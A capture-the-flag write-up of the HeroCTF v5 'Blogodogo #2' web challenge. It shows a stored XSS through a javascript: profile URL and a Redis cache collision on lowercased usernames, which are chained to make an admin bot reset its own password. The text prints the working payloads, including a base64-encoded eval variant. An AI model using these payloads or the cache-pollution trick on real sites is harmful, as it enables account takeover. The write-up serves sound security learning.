---
title: "[Medium][HeroCTF v5][Web] Blogodogo #2"
date: "2023-14-13"
categories: [ "CTF", "HeroCTF v5", "Web" ]
tags: [ "Cache pollution", "XSS", "Django" ]
slug: "blogodogo-2"
ShowToc: false
draft: false
weight: 5
---

## Introduction

Log in to the admin account and retrieve the flag.

The challenge sources are available on my [Github](https://github.com/mxcezl/HeroCTF-v5-Sources/tree/main/Web/Blogodogo/Blogodogo%20Sources).

## Prerequisites

- Completed the challenge `Blogodogo #1`
- The referral token `83d99a0ac225079db31b44a2e58b19f0` to create an account.

## Solution

After successfully completing the previous challenge, `Blogodogo #1`, we obtain a referral code that allows us to create an account.

This allows us to create an account with the credentials `test:test`.

In the challenge sources, there is a directory called [/bot](https://github.com/mxcezl/HeroCTF-v5-Sources/tree/main/Web/Blogodogo/Blogodogo%20Sources/bot) which simulates an administrator's connection and clicks on a link passed as a parameter:

```javascript
if (process.argv.length === 2) {
    console.error("No URL provided!");
    process.exit(1);
}

goto(process.argv[2]); // Go to the URL passed as a parameter
```

We need to find where the bot is launched in the sources, and we find this function in `routes.py` that triggers the bot if the URL passed as a parameter is valid:

```python
@bp_routes.route("/post/report", methods=["POST"])
def report_post():
    url = request.form.get("url", "")

    if not re.match("^http://localhost:5000/.*", url):
        flash("URL not valid, please match: ^http://localhost:5000/.*", "warning")
        return redirect(url_for('bp_routes.index'))

    subprocess.run(["node", "/app/bot/bot.js", url])
    flash("Your request has been sent to an administrator!", "success")
    return redirect(url_for('bp_routes.index'))
```

> Note: The `subprocess.run()` function allows executing a command in the terminal, but in our case, there is no possibility of command injection. To make the `subprocess.run()` call vulnerable, the `shell` argument would need to be set to `True` (by default, it is `False`).
>
> Example: `subprocess.run(["node", "/app/bot/bot.js", url], shell=True)`

To send the URL to the bot, the URL needs to be in the format `http://localhost:5000/...`.

Undoubtedly, this will involve an XSS exploit at some point.

## Finding the XSS

We know that we can send a link to the administrator, but we don't know yet how to make them execute JavaScript.

We need to find an entry point for our XSS.

### First lead: posts

The first injection I tested was injecting into an article.

I tried injecting JavaScript and HTML into the title, slug, and content of the article, but special characters are being escaped.

**Injections into posts are not possible.**

### Second lead: usernames

The second injection I tested was injecting into the username.

I tried injecting JavaScript and HTML into the username, but once again, special characters are being escaped.

**Injections into usernames are not possible.**

### Third lead: user profile

For the last lead, I turned to the user profile page.

On this page, we find a form to modify the username, password, website, and avatar.

![profile page](/images/heroctfv5/web/blog_profile.png)

If we look at the page's source code, we come across this script:

```javascript
addEventListener('DOMContentLoaded', (event) => {
    let hash = window.location.hash;
    if (hash !== '') {
        let button = document.getElementById(hash.slice(1));
        button.click();
    }
});
```

It seems we are on the right track to find our XSS because the script retrieves the URL's hash and clicks on the element with that ID.

This means that with a URL in the format `http://localhost:5000/profile#<id>`, we can make the script click on an element of the page.

Looking at the page, we see two clickable elements: the "Author's website" link and the "Share your profile" button.

![profile page](/images/heroctfv5/web/blog_website.png)

The link to the author's website corresponds to `/profile#` for now, and the "Share your profile" button opens a pop-up.

If we look at the form on the profile page, we see that we can modify the "Custom URL".

When trying to modify the "Custom URL" with a random URL, we see that the "Author's website" link is updated with our URL.

![profile page](/images/heroctfv5/web/blog_url.png)

We can naively try an XSS with the URL `"><script>alert();</script>` and see if the script is executed.

Unfortunately, except for parentheses, special characters are escaped.

```html
<a id="author-website" class="text-center" href="&#34;&gt;&lt;script&gt;alert();&lt;/script&gt;">Author's website</a>
```

We can try another payload, `javascript:alert()`, which does not require leaving the href attribute.

![alert](/images/heroctfv5/web/hero_alert.png)

And there we realize that we have successfully executed JavaScript!

If we remember the script we found on the home page earlier, by sending the URL `/profile#author-website`, we can make the admin bot click on the "Author's website" link and execute our JavaScript.

Now we can go further and try to steal the admin's cookie.

## Stealing the Admin's Cookie

To steal the admin's cookie, we would need to create a payload that extracts a user's cookies and sends them to our server.

After several attempts, I was unable to steal the cookies because `document.cookie` is empty.

The reason for this can be found in the `config.py` file where cookie configuration is set:

```python
[...]
class TestConfig:
    DEBUG = True
    DEVELOPMENT = True

    BLOG_NAME = "Blogodogo"
    REFERRAL_CODE = getenv("REFERRAL_CODE")

    SECRET_KEY = token_hex()
    SESSION_COOKIE_HTTPONLY = True
    SESSION_COOKIE_SECURE = False

    SQLALCHEMY_DATABASE_URI = "sqlite:///:memory:"
    SQLALCHEMY_TRACK_MODIFICATIONS = False
```

We can see that `SESSION_COOKIE_HTTPONLY` is set to `True`, which means that cookies are not accessible in JavaScript.

> Source: https://flask.palletsprojects.com/en/2.3.x/config/#SESSION_COOKIE_HTTPONLY

Therefore, we need to find another way to access the admin account since we cannot steal their cookies via XSS.

## Changing the Password

Let's take a closer look at the profile editing form. Here's the relevant code responsible for it:

```python
@bp_routes.route("/profile", methods=["GET", "POST"])
@login_required
def profile():
    form = EditProfileForm()
    if form.validate_on_submit():
        author = Authors.query.filter_by(id=current_user.id).first()

        _username = form.username.data
        _new_password = form.new_password.data
        _new_password_confirm = form.new_password_confirm.data
        _url = form.url.data
        _avatar = form.avatar.data

        if author.username != _username and Authors.query.filter_by(username=_username).first():
            flash("Username already exists.", "warning")
            return render_template("pages/profile.html", title="My profile", form=form)

        if _new_password and _new_password != _new_password_confirm:
            flash("The two passwords do not match", "warning")
            return render_template("pages/profile.html", title="My profile", form=form)

        author.username = _username
        author.password = _new_password
        if _url:
            author.url = _url
        if _avatar:
            author.avatar = _avatar

        db.session.add(author)
        db.session.commit()
        flash("Profile successfully edited.", "success")

        [...] # Rest of the cropped code for readability
```

We can see two checks here:

- If the new username already exists
- If the two passwords do not match

However, we notice that the value of the old password requested on the web interface is not used.

This means that by successfully executing JavaScript on the admin, we could make them go through a process that changes their password.

Recall that the admin can visit a link sent to them via `/post/report`, and they can click on the link to their profile if we send them the URL `/profile#author-website`.

> Note: We will see later in the write-up that it is possible to overwrite the admin's custom URL value and thus make them execute our password change script.

To create a script that changes the admin's password, we need four things:

- Change the value of the `username` field to match `admin`
- Change the value of the `new_password` field to `cracked`
- Change the value of the `new_password_confirm` field to `cracked`
- Click the `Edit Profile` button

Here is the script I wrote to accomplish this:

```javascript
let username = document.getElementById('username');
let new_password = document.getElementById('new_password');
let new_password_confirm = document.getElementById('new_password_confirm');
let submit = document.getElementById('submit');

username.value = 'admin';
new_password.value = 'cracked';
new_password_confirm.value = 'cracked';
submit.click();
```

This script can be executed in a single line:

```javascript
document.getElementById('username').value='admin';document.getElementById('new_password').value='cracked';document.getElementById('new_password_confirm').value='cracked';document.getElementById('submit').click();
```

We can try it on our profile by updating the `Custom URL` with this payload:

```
javascript:document.getElementById('username').value='admin';document.getElementById('new_password').value='cracked';document.getElementById('new_password_confirm').value='cracked';document.getElementById('submit').click();
```

![alert](/images/heroctfv5/web/blog_rename_admin.png)

The script works fine, but we cannot rename ourselves to `admin` since the username already exists.

However, when trying it with the username of the account I created, `test`, we can see that the script works and the password is changed.

But I notice something strange... Sometimes when I change my URL, it is not updated.

## Injecting a Custom URL on the Admin's Profile

To better understand this, let's look at the rest of the `/profile` route in the `routes.py` file:

```python
@bp_routes.route("/profile", methods=["GET", "POST"])
@login_required
def profile():
    form = EditProfileForm()
    
    [...] # Cropped code for readability

    key_name_url = "profile_" + current_user.username.lower() + "_url"
    key_name_username = "profile_" + current_user.username.lower() + "_username" 

    cache_url, cache_username = redis_client.get(key_name_url), redis_client.get(key_name_username)
    if not cache_url or not cache_username:
        redis_client.set(key_name_username, current_user.username)
        redis_client.expire(key_name_username, 60)

        redis_client.set(key_name_url, current_user.url)
        redis_client.expire(key_name_url, 60)

    cache_url, cache_username = redis_client.get(key_name_url).decode(), redis_client.get(key_name_username).decode()
    return render_template("pages/profile.html", title="My profile", form=form,
        cache_url=cache_url, cache_username=cache_username)
```

Here, we can see the Redis caching process.

Every time a user visits the `/profile` page, their `username` and custom `url` are cached in Redis.

We can see that it is not actually the `username` used for the cache, but the lowercase username.

Here's the detailed process for the user `tEST` visiting their profile:

- Generating Redis keys
    - `profile_test_url`
    - `profile_test_username`
- Retrieving cached values
- If the keys do not exist in the cache
    - Caching the values
    - Expiring the keys after 60 seconds
- Displaying the profile with the cached values

We can see that the `username` used in the Redis keys is `test` and not `tEST` because it is converted to lowercase.

This means that we can create an account with the username `ADMIN`, and it will have the same cached values as the `admin` user.

Thus, we can immediately think of an attack that will change the administrator's password by polluting the cache with our payload.

So I created an account with the username `ADMIN` and put the payload from earlier in the `Custom URL` field:

```javascript
javascript:document.getElementById('username').value='admin';document.getElementById('new_password').value='cracked';document.getElementById('new_password_confirm').value='cracked';document.getElementById('submit').click();
```

![alert](/images/heroctfv5/web/blog_my_admin_profile.png)

To ensure that the payload is properly interpreted, I performed an execution using a base64-encoded string:

```javascript
javascript:eval(atob(/ZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3VzZXJuYW1lJykudmFsdWU9J2FkbWluJztkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnbmV3X3Bhc3N3b3JkJykudmFsdWU9J2NyYWNrZWQnO2RvY3VtZW50LmdldEVsZW1lbnRCeUlkKCduZXdfcGFzc3dvcmRfY29uZmlybScpLnZhbHVlPSdjcmFja2VkJztkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnc3VibWl0JykuY2xpY2soKTs=/.source))
```

The cache was updated with this payload, and the `admin` account now has the same custom URL as mine.

> Note: We can verify that cache pollution works by creating another `admin` account with a letter or more in uppercase. With this account, when visiting its profile, we can see that the author's website custom URL is the one defined earlier on the other account.

If I send the URL `/profile#author-website` as a report to the administrator, their password will be changed to `cracked`.

```bash
curl -X POST -d "url=http://localhost:5000/profile#author-website" http://dyn-02.heroctf.fr:12077/post/report
<!doctype html>
<html lang=en>
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to the target URL: <a href="/">/</a>. If not, click the link.
```

The administrator has been notified of my report, and their password has been changed.

> **Important**: The URL must be sent to the admin within 60 seconds after polluting the cache; otherwise, the cache will expire, and the URL containing the payload will not be retrieved.

We can now log in with the username `admin` and the password `cracked`:

![alert](/images/heroctfv5/web/blog_admin_logged.png)

Flag: `Hero{very_n1ce_move_into_c4che}`

## Tips & Tricks

- Always refer to the documentation of the functions used in the source code when testing for an injection.
- Look into the source code of the pages.
- The `SESSION_COOKIE_HTTPONLY` parameter allows restricting access to the session cookie in JavaScript on Django.
- When unable to access cookies during an XSS (Cross-Site Scripting) attack, find alternative ways to access the account, such as changing the administrator's password.
- Verify how access controls are implemented on the pages.
- Check how caching is managed and its lifespan.